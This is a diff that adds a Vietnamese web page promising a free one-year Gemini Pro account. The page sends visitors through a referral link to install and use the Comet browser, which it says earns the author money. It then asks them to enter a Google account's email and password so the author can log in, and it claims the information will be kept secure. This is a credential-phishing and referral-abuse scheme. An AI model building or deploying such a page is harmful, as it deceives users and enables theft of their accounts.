@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gemini Pro 1 Năm Miễn Phí - Neo-brutalism</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <!-- Language Switcher & Admin Access -->
+    <div class="top-bar">
+        <div class="language-switcher">
+            <button class="lang-btn active" onclick="changeLanguage('vi')">🇻🇳 VI</button>
+            <button class="lang-btn" onclick="changeLanguage('en')">🇬🇧 EN</button>
+        </div>
+        <div class="admin-access">
+            <button class="admin-btn" onclick="toggleAdminLogin()">🔐 Admin</button>
+        </div>
+    </div>
+
+    <!-- Admin Login Popup -->
+    <div class="admin-login-popup" id="adminLoginPopup">
+        <div class="admin-login-card">
+            <h3>🔐 Admin Access</h3>
+            <input 
+                type="password" 
+                id="adminPassword" 
+                class="admin-input" 
+                placeholder="Nhập mật khẩu admin..."
+                onkeypress="if(event.key === 'Enter') adminLogin()"
+            >
+            <button class="btn btn-primary" onclick="adminLogin()">Đăng nhập</button>
+            <button class="btn btn-secondary" onclick="toggleAdminLogin()">✕ Đóng</button>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <h1 class="header-title">GEMINI PRO FREE</h1>
+            <p class="header-subtitle">Nhận tài khoản 1 năm miễn phí</p>
+        </header>
+
+        <!-- Progress Bar -->
+        <div class="progress-container">
+            <div class="progress-step active" data-step="1">
+                <div class="progress-circle">1</div>
+                <div class="progress-label">Giới thiệu</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="2">
+                <div class="progress-circle">2</div>
+                <div class="progress-label">Hướng dẫn</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="3">
+                <div class="progress-circle">3</div>
+                <div class="progress-label">Thông tin</div>
+            </div>
+            <div class="progress-line"></div>
+            <div class="progress-step" data-step="4">
+                <div class="progress-circle">4</div>
+                <div class="progress-label">Hoàn thành</div>
+            </div>
+        </div>
+
+        <!-- Step 1: Introduction -->
+        <div class="step-container active" data-step="1">
+            <div class="card">
+                <div class="card-header">
+                    <h2>👋 Chào mừng bạn!</h2>
+                </div>
+                <div class="card-body">
+                    <div class="info-box">
+                        <p class="large-text">
+                            Mình tạo ra trang web này với mục đích giúp đỡ những bạn chưa đăng kí được 
+                            <strong>tài khoản Gemini Pro 1 năm</strong>, nhưng trước khi nhận được quyền lợi, 
+                            bạn hãy giúp mình thực hiện 1 vài thao tác nhỏ này nhé.
+                        </p>
+                        <div class="highlight-box">
+                            <p>
+                                ✨ Đây là 1 chương trình <strong>invited nhỏ</strong>, khi bạn làm thì mình 
+                                sẽ nhận được 1 chút tiền. Sau đó sẽ có tuỳ chọn để bạn nhập và nhận 
+                                <strong>gói GEMINI PRO 1 năm</strong> nhé.
+                            </p>
+                        </div>
+                        <p class="thank-you">CẢM ƠN BẠN RẤT NHIỀU! 💝</p>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-primary" onclick="nextStep()">
+                        Bắt đầu ngay →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 2: Instructions -->
+        <div class="step-container" data-step="2">
+            <div class="card">
+                <div class="card-header">
+                    <h2>📋 Hướng dẫn chi tiết</h2>
+                </div>
+                <div class="card-body">
+                    <div class="alert alert-warning">
+                        <strong>⚠️ Lưu ý:</strong> Nếu bạn đã tải trình duyệt Comet trước đó, thì rất tiếc chương trình này chưa dành cho bạn.
+                    </div>
+                    
+                    <div class="alert alert-info">
+                        <strong>💻 Quan trọng:</strong> Hãy sử dụng máy tính để thực hiện yêu cầu nhé, vì đây là phần mềm trên máy tính.
+                    </div>
+                    
+                    <p class="instruction-intro">Vui lòng thực hiện các bước sau:</p>
+                    
+                    <div class="instruction-box">
+                        <div class="instruction-number">1</div>
+                        <div class="instruction-content">
+                            <h3>Truy cập link và tải phần mềm Comet</h3>
+                            <p>Nhấn vào nút bên dưới để truy cập link tải xuống</p>
+                            <a href="https://pplx.ai/kiru23" target="_blank" class="btn btn-secondary btn-link">
+                                🔗 Truy cập link tải Comet
+                            </a>
+                        </div>
+                    </div>
+
+                    <div class="instruction-box">
+                        <div class="instruction-number">2</div>
+                        <div class="instruction-content">
+                            <h3>Đăng nhập Comet</h3>
+                            <p>Đăng nhập Comet bằng <strong>tài khoản Google</strong> giống đúng với tài khoản Google đã nhấp vào link trước đó</p>
+                        </div>
+                    </div>
+
+                    <div class="instruction-box">
+                        <div class="instruction-number">3</div>
+                        <div class="instruction-content">
+                            <h3>Sử dụng Comet</h3>
+                            <p>Mở trình duyệt Comet và <strong>hỏi 1 vài câu hỏi bất kì</strong></p>
+                        </div>
+                    </div>
+
+                    <div class="instruction-box">
+                        <div class="instruction-number">4</div>
+                        <div class="instruction-content">
+                            <h3>Đặt làm mặc định</h3>
+                            <p>Đặt <strong>Comet làm trình duyệt mặc định</strong></p>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <strong>📌 Lưu ý:</strong> Sau khi thực hiện, nếu đúng và thành công thì mình sẽ xác nhận được, 
+                        và sẽ ngay lập tức hoàn thành tài khoản Gemini PRO giúp bạn.
+                    </div>
+
+                    <div class="checkbox-container">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="confirmSteps" class="checkbox-input">
+                            <span class="checkbox-custom"></span>
+                            <span class="checkbox-text">Tôi đã hoàn thành tất cả các bước trên</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-secondary" onclick="previousStep()">
+                        ← Quay lại
+                    </button>
+                    <button class="btn btn-primary" id="continueBtn" onclick="nextStep()" disabled>
+                        Tiếp tục →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 3: User Information -->
+        <div class="step-container" data-step="3">
+            <div class="card">
+                <div class="card-header">
+                    <h2>📝 Thông tin tài khoản</h2>
+                </div>
+                <div class="card-body">
+                    <p class="form-intro">Vui lòng nhập thông tin tài khoản Google của bạn để nhận Gemini Pro:</p>
+                    
+                    <div class="alert alert-info">
+                        <strong>💡 Ghi chú quan trọng:</strong> Bạn hãy giúp mình tạo 1 tài khoản Google mới nhé (có thể sử dụng điện thoại để tạo)
+                    </div>
+                    
+                    <div class="alert alert-success">
+                        <strong>🔒 Bảo mật:</strong> Mình sẽ đăng nhập tài khoản và giúp bạn kích hoạt, bạn có thể đổi mật khẩu ngay sau đó.
+                    </div>
+                    
+                    <form id="userForm" class="form">
+                        <div class="form-group">
+                            <label for="email" class="form-label">Email Google *</label>
+                            <input 
+                                type="email" 
+                                id="email" 
+                                class="form-input" 
+                                placeholder="example@gmail.com"
+                                required
+                            >
+                            <span class="form-hint">Email tài khoản Google bạn đã sử dụng</span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="password" class="form-label">Mật khẩu *</label>
+                            <div class="password-wrapper">
+                                <input 
+                                    type="password" 
+                                    id="password" 
+                                    class="form-input" 
+                                    placeholder="Nhập mật khẩu"
+                                    required
+                                >
+                                <button type="button" class="toggle-password" onclick="togglePassword()">
+                                    👁️
+                                </button>
+                            </div>
+                            <span class="form-hint">Mật khẩu tài khoản Google của bạn</span>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="contactEmail" class="form-label">Email liên hệ *</label>
+                            <input 
+                                type="email" 
+                                id="contactEmail" 
+                                class="form-input" 
+                                placeholder="contact@example.com"
+                                required
+                            >
+                            <span class="form-hint">Email để chúng tôi liên hệ với bạn</span>
+                        </div>
+
+                        <div class="alert alert-warning">
+                            <strong>⚠️ Quan trọng:</strong> Thông tin của bạn sẽ được bảo mật tuyệt đối và chỉ 
+                            được sử dụng để kích hoạt Gemini Pro cho tài khoản của bạn.
+                        </div>
+                    </form>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-secondary" onclick="previousStep()">
+                        ← Quay lại
+                    </button>
+                    <button class="btn btn-primary" onclick="submitForm()">
+                        Xác nhận →
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 4: Success -->
+        <div class="step-container" data-step="4">
+            <div class="card">
+                <div class="card-header success">
+                    <h2>✅ Hoàn thành!</h2>
+                </div>
+                <div class="card-body text-center">
+                    <div class="success-animation">
+                        <div class="success-icon">🎉</div>
+                    </div>
+                    <h3 class="success-title">Cảm ơn bạn đã hoàn thành!</h3>
+                    <p class="success-message">
+                        Chúng tôi đã nhận được thông tin của bạn. Tài khoản Gemini Pro 1 năm của bạn 
+                        sẽ được kích hoạt trong vòng <strong>10-20 phút</strong>.
+                    </p>
+                    <div class="alert alert-success">
+                        <p>📧 Bạn sẽ nhận được email xác nhận sau khi tài khoản được kích hoạt thành công.</p>
+                    </div>
+                    <div class="info-box">
+                        <p><strong>Lưu ý:</strong></p>
+                        <ul class="info-list">
+                            <li>Kiểm tra email của bạn sau 10-20 phút</li>
+                            <li>Nếu có vấn đề, chúng tôi sẽ liên hệ qua email bạn đã cung cấp</li>
+                            <li>Cảm ơn bạn đã tin tưởng và hỗ trợ!</li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="card-footer">
+                    <button class="btn btn-primary full-width" onclick="resetForm()">
+                        🏠 Về trang chủ
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>© 2025 Gemini Pro Free. Made with ❤️</p>
+        </footer>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+        <p class="loading-text">Đang xử lý...</p>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="config.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
